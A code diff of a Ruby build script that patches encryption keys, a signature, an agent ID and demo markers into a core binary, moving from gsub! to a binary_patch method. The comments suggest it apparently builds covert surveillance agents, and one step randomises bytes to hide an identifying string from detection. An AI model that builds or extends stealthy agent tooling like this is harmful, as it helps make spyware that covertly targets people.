@@ -6,6 +6,7 @@ require_relative 'exec'
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/binary'
 
 require 'fileutils'
 require 'tmpdir'
@@ -94,7 +95,7 @@ class Build
     # evidence encryption key
     begin
       key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
-      content.gsub! '3j9WmmDgBqyU270FTid3719g64bP4s52', key
+      content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', key
     rescue
       raise "Evidence key marker not found"
     end
@@ -102,7 +103,7 @@ class Build
     # conf encryption key
     begin
       key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
-      content.gsub! 'Adf5V57gQtyi90wUhpb8Neg56756j87R', key
+      content.binary_patch 'Adf5V57gQtyi90wUhpb8Neg56756j87R', key
     rescue
       raise "Config key marker not found"
     end
@@ -111,7 +112,7 @@ class Build
     begin
       sign = ::Signature.where({scope: 'agent'}).first
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
     rescue
       raise "Signature marker not found"
     end
@@ -121,20 +122,22 @@ class Build
       id = @factory.ident.dup
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
-      content.gsub! 'av3pVck1gb4eR2', id
+      content.binary_patch 'av3pVck1gb4eR2', id
     rescue
       raise "Agent ID marker not found"
     end
 
     # demo parameters
     begin
-      content.gsub!('hxVtdxJ/Z8LvK3ULSnKRUmLE', SecureRandom.random_bytes(24)) unless params['demo']
+      content.binary_patch 'hxVtdxJ/Z8LvK3ULSnKRUmLE', SecureRandom.random_bytes(24) unless params['demo']
     rescue
       raise "Demo marker not found"
     end
 
-    raise "BUG: misaligned binary patch" if File.size(path(params[:core])) != content.bytesize
-    
+    if File.size(path(params[:core])) != content.bytesize
+      raise "BUG: misaligned binary patch: #{File.size(path(params[:core]))} #{content.bytesize}"
+    end
+
     file.rewind
     file.write content
     file.close
